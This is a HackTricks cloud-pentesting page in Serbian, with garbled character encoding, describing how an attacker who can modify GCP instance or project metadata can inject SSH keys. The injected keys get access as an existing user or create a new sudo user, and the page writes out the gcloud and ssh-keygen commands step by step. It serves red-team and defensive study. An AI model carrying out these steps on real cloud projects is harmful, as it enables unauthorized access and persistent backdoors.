# GCP - Dodavanje prilagoÄ‘enih SSH metapodataka

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite videti **oglaÅ¡avanje vaÅ¡e kompanije na HackTricks-u** ili **preuzeti HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Modifikacija metapodataka <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Modifikacija metapodataka na instanci moÅ¾e dovesti do **znaÄajnih sigurnosnih rizika ako napadaÄ stekne potrebne dozvole**.

### **UkljuÄivanje SSH kljuÄeva u prilagoÄ‘ene metapodatke**

Na GCP-u, **Linux sistemi** Äesto izvrÅ¡avaju skripte iz [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). KritiÄna komponenta ovoga je [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), koji je dizajniran da **redovno proverava** krajnju taÄku metapodataka instance radi **aÅ¾uriranja autorizovanih SSH javnih kljuÄeva**.

Dakle, ako napadaÄ moÅ¾e da izmeni prilagoÄ‘ene metapodatke, moÅ¾e naterati demona da pronaÄ‘e novi javni kljuÄ, koji Ä‡e biti obraÄ‘en i **integriran u lokalni sistem**. KljuÄ Ä‡e biti dodat u `~/.ssh/authorized_keys` fajl postojeÄ‡eg korisnika ili potencijalno Ä‡e biti kreiran novi korisnik sa `sudo` privilegijama, u zavisnosti od formata kljuÄa. NapadaÄ Ä‡e moÄ‡i da kompromituje host.

### **Dodavanje SSH kljuÄa postojeÄ‡em privilegovanom korisniku**

1. **Pregled postojeÄ‡ih SSH kljuÄeva na instanci:**
- IzvrÅ¡ite komandu za opisivanje instance i njenih metapodataka kako biste pronaÅ¡li postojeÄ‡e SSH kljuÄeve. Relevantni deo u izlazu Ä‡e biti pod `metadata`, taÄnije kljuÄ `ssh-keys`.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- Obratite paÅ¾nju na format SSH kljuÄeva: korisniÄko ime prethodi kljuÄu, odvojeni dvotaÄkom.

2. **Pripremite tekstualni fajl za metapodatke SSH kljuÄeva:**
- SaÄuvajte detalje korisniÄkih imena i njihovih odgovarajuÄ‡ih SSH kljuÄeva u tekstualni fajl nazvan `meta.txt`. Ovo je neophodno kako biste saÄuvali postojeÄ‡e kljuÄeve prilikom dodavanja novih.

3. **GeneriÅ¡ite novi SSH kljuÄ za ciljnog korisnika (`alice` u ovom primeru):**
- Koristite `ssh-keygen` komandu za generisanje novog SSH kljuÄa, obezbeÄ‘ujuÄ‡i da polje za komentar (`-C`) odgovara ciljnom korisniÄkom imenu.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Dodajte novi javni kljuÄ u `meta.txt`, oponaÅ¡ajuÄ‡i format koji se nalazi u metapodacima instance.

4. **AÅ¾urirajte metapodatke SSH kljuÄeva instance:**
- Primijenite aÅ¾urirane metapodatke SSH kljuÄeva na instancu koristeÄ‡i `gcloud compute instances add-metadata` komandu.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **Pristupite instanci koristeÄ‡i novi SSH kljuÄ:**
- PoveÅ¾ite se sa instancom putem SSH-a koristeÄ‡i novi kljuÄ, pristupajuÄ‡i ljusci u kontekstu ciljnog korisnika (`alice` u ovom primeru).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Kreiranje novog privilegovanog korisnika i dodavanje SSH kljuÄa**

Ako nije pronaÄ‘en nijedan interesantan korisnik, moguÄ‡e je kreirati novog korisnika koji Ä‡e dobiti `sudo` privilegije:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### SSH kljuÄevi na nivou projekta <a href="#sshing-around" id="sshing-around"></a>

MoguÄ‡e je proÅ¡iriti pristup SSH-u na viÅ¡e virtuelnih maÅ¡ina (VM) u cloud okruÅ¾enju **primenom SSH kljuÄeva na nivou projekta**. Ovaj pristup omoguÄ‡ava SSH pristup bilo kojoj instanci unutar projekta koja nije eksplicitno blokirala SSH kljuÄeve na nivou projekta. Evo saÅ¾etog vodiÄa:

1. **Primenite SSH kljuÄeve na nivou projekta:**
- Koristite `gcloud compute project-info add-metadata` komandu da biste dodali SSH kljuÄeve iz `meta.txt` u metapodatke projekta. Ova akcija osigurava da se SSH kljuÄevi prepoznaju na svim VM-ovima u projektu, osim ako VM ima omoguÄ‡enu opciju "Blokiraj SSH kljuÄeve na nivou projekta".
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **SSH pristup instancama koriÅ¡Ä‡enjem kljuÄeva na nivou projekta:**
- Sa kljuÄevima na nivou projekta, moÅ¾ete SSH-ovati na bilo koju instancu unutar projekta. Instance koje ne blokiraju kljuÄeve na nivou projekta Ä‡e prihvatiti SSH kljuÄ i omoguÄ‡iti pristup.
- Direktan naÄin za SSH pristup instanci je koriÅ¡Ä‡enje `gcloud compute ssh [INSTANCA]` komande. Ova komanda koristi vaÅ¡e trenutno korisniÄko ime i SSH kljuÄeve postavljene na nivou projekta kako bi pokuÅ¡ala pristup.

# Reference
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
